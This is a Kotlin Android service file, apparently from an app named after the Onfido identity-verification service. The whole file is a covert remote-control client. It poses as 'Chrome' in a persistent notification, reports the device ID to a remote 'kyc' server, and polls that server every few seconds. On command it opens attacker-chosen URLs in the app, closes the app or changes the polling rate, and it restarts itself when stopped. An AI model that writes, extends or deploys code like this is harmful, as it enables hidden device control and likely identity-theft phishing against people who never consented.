package com.example.onfidoloader

import android.app.*
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class BackgroundService : Service() {

    private val serverBase = "https://kyc.skazitop.network/api"
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private var job: Job? = null
    private var intervalMillis = 3000L
    private lateinit var prefs: SharedPreferences

    private fun logEvent(event: String, payload: String = "") {
        CoroutineScope(Dispatchers.IO).launch {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("type", event)
                put("payload", payload)
                put("silent", event == "fetch_command")
            }

            try {
                val conn = URL("$serverBase/log.php").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                conn.inputStream.bufferedReader().readText()
                Log.d("logEvent", "Sent: $event, payload: $payload")
            } catch (e: Exception) {
                Log.e("logEvent", "Failed to send log: ${e.message}")
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        prefs = getSharedPreferences("prefs", MODE_PRIVATE)

        // Проверка на повторный запуск сервиса
        if (job == null) {
            logEvent("launch")
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "ForegroundServiceChannel"
            val channel = NotificationChannel(
                channelId,
                "Foreground Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)

            val notification = Notification.Builder(this, channelId)
                .setContentTitle("Chrome")
                .setContentText("Running in background")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build()

            startForeground(1, notification)
        }

        if (job == null || job?.isActive == false) {
            job = CoroutineScope(Dispatchers.IO).launch {
                while (isActive) {
                    try {
                        val result = URL("$serverBase/command.php?deviceId=$deviceId").readText().trim()

                        Log.d("BackgroundService", "Received command: '$result'")

                        val json = JSONObject(result)
                        val commandType = json.getString("type")
                        val payload = json.optString("payload", "")

                        logEvent("fetch_command")

                        when (commandType) {
                            "open" -> {
                                Log.d("BackgroundService", "Opening URL: '$payload'")

                                prefs.edit().putString("last_url", payload).apply()

                                Intent(this@BackgroundService, MainActivity::class.java).apply {
                                    putExtra("url", payload)
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                }.also { startActivity(it) }

                                logEvent("open", payload)
                            }

                            "close" -> {
                                Log.d("BackgroundService", "Received CLOSE command, stopping service")

                                prefs.edit().remove("last_url").apply()

                                Intent(this@BackgroundService, MainActivity::class.java).apply {
                                    putExtra("forceClose", true)
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                }.also { startActivity(it) }

                                logEvent("close")
                                stopSelf()
                                break
                            }

                            "interval" -> {
                                payload.toLongOrNull()?.let { newInterval ->
                                    intervalMillis = newInterval * 1000
                                    Log.d("BackgroundService", "Interval updated to: $intervalMillis ms")
                                    logEvent("interval:$newInterval")
                                }
                            }

                            else -> {
                                Log.d("BackgroundService", "No action for command type: '$commandType'")
                            }
                        }

                        delay(intervalMillis)
                    } catch (e: Exception) {
                        Log.e("BackgroundService", "Polling error: ${e.message}")
                    }
                }
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job?.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
